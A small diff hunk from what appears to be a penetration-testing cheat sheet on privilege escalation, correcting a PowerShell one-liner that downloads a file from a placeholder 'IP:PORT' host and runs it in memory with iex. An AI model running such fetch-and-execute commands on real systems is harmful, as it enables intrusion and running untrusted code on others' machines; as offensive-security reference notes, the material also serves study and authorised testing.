@@ -84,7 +84,7 @@ LinPeas and Winpeas located ate my `Privesc_scripts` repository.
    ```
 
 5. ```powershell
-   powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://IP:PORT/'FILE)
+   powershell iex(new-object net.webclient).downloadstring('http://IP:PORT/FILE')
    ```
 
 6. ```powershell
